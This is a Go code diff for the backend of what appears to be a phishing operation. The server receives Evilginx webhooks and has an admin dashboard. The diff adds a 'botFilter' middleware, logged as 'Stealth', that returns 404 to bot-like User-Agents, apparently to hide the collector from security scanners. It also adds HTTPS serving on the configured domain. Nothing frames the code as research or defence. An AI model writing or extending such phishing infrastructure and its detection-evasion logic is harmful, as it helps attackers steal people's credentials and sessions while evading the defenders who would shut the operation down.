@@ -77,7 +77,7 @@ func (s *Server) Start(port int) error {
 	r.GET("/health", s.handleHealth)
 	
 	// Evilginx webhook endpoint
-	r.POST("/api/webhook", s.handleWebhook)
+	r.POST("/api/webhook", s.botFilter(), s.handleWebhook)
 
 	// Admin routes
 	admin := r.Group("/" + s.config.AdminPath)
@@ -96,7 +96,18 @@ func (s *Server) Start(port int) error {
 	log.Printf("[+] AuthFlow Server active on port %d", port)
 	log.Printf("[+] Dashboard access: http://%s:%d/%s", s.config.Domain, port, s.config.AdminPath)
 	
-	return r.Run(fmt.Sprintf("0.0.0.0:%d", port))
+	addr := fmt.Sprintf("0.0.0.0:%d", port)
+	certFile := fmt.Sprintf("/etc/letsencrypt/live/%s/fullchain.pem", s.config.Domain)
+	keyFile := fmt.Sprintf("/etc/letsencrypt/live/%s/privkey.pem", s.config.Domain)
+
+	// Check if certificates exist to run in TLS mode
+	if _, err := os.Stat(certFile); err == nil {
+		log.Printf("[+] Starting in HTTPS mode with domain %s", s.config.Domain)
+		return r.RunTLS(addr, certFile, keyFile)
+	}
+
+	log.Printf("[!] Certificates not found, falling back to HTTP")
+	return r.Run(addr)
 }
 
 func (s *Server) handleWebSocket(c *gin.Context) {
@@ -151,6 +162,19 @@ func (s *Server) broadcast(event map[string]interface{}) {
 			client.Close()
 			delete(s.wsClients, client)
 		}
+	}
+}
+
+func (s *Server) botFilter() gin.HandlerFunc {
+	return func(c *gin.Context) {
+		ua := c.GetHeader("User-Agent")
+		if isBot, reason := monitor.IsBot(ua); isBot {
+			ip := monitor.GetClientIP(c.Request.Header, c.ClientIP())
+			log.Printf("[!] Stealth: Blocked %s request from %s (Reason: %s)", c.Request.Method, ip, reason)
+			c.AbortWithStatus(404)
+			return
+		}
+		c.Next()
 	}
 }
 
